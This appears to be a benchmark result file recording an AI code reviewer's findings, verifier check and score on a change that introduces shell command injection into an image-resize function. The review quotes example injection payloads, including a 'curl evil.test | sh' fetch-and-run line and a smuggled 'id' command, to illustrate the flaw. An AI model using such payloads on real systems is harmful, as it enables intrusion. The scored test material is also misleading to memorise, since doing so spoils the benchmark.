@@ -1,0 +1,92 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "ef19c30e9434",
+  "turns": 5,
+  "tool_calls": null,
+  "seconds": 86.0,
+  "setup_seconds": 0.1,
+  "total_seconds": 86.1,
+  "usage": {
+    "in": 60037,
+    "cache_read": 89600,
+    "cache_write": 0,
+    "out": 2349,
+    "source": "cli"
+  },
+  "cost_usd": 0.161048,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "Switching from `execFile` to `exec` runs the command through a shell and interpolates `src` and `filter` into the string. User-composed filter expressions (per the new comment) can inject arbitrary commands, e.g. `filter = \"Lanczos; curl evil.test | sh\"` or `src = \"img.png\\\"; id > /tmp/pwned; #\"`.\n\nImageMagick `-filter` does not need a shell \u2014 pass it as an argv element with `execFile`:\n\n```suggestion\nimport { execFile } from \"child_process\";\n\nexport function resize(src: string, filter: string, w: number): Promise<string> {\n  // Pass filter as argv \u2014 no shell required for -filter\n  return new Promise((res, rej) => {\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n  });\n}\n```\n\nAlso validate `filter` against an allowlist of known ImageMagick filter names if the value is truly user-facing."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity": "warning",
+      "body": "`resize` is an exported API whose parameter list changed from `(src, w)` to `(src, filter, w)`. Existing callers that still pass width as the second argument will treat a number as the filter string and send the wrong argv/width downstream (or fail at compile time in TS consumers). If this is intentional, version the export or add an overload/default; document the breaking change in the PR."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a critical command-injection vulnerability by switching from `execFile` to shell `exec` and interpolating user-controlled values into the command string.\n\n## Analysis\n\n`resize` previously invoked ImageMagick safely via `execFile` with an argv array (no shell). The new code builds a shell string:\n\n```ts\nexec(`convert \"${src}\" -filter ${filter} -resize ${w}x /tmp/out.png`, ...)\n```\n\nThe comment states filters are **user-composed**. Both `filter` and `src` are untrusted input in that model:\n\n- `filter` is unquoted, so metacharacters (`;`, `|`, `$(...)`, backticks, `&&`) run as shell commands.\n- `src` is only double-quoted; a path containing `\"` still breaks out of the string.\n- `w` is interpolated unquoted; a non-numeric value at runtime is also injectable.\n\nImageMagick `-filter` accepts a normal argv token (e.g. `Lanczos`). Complex expressions do **not** require a shell \u2014 keep `execFile` and pass `-filter` and the filter value as separate arguments.\n\nThe function signature also changes from `(src, w)` to `(src, filter, w)`, which breaks any existing callers (none in-repo, but this is still a public export contract change).\n\n## Release decision\n\n**Recommendation:** request-changes\n",
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The patch switches from execFile argv to exec with a shell string that interpolates both `src` and `filter` unescaped; the new comment even labels filter as user-composed. That is a real command-injection regression at critical severity."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "not sampled"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 10.044,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2509,
+      "out": 420
+    },
+    "cost_usd": 0.008536
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
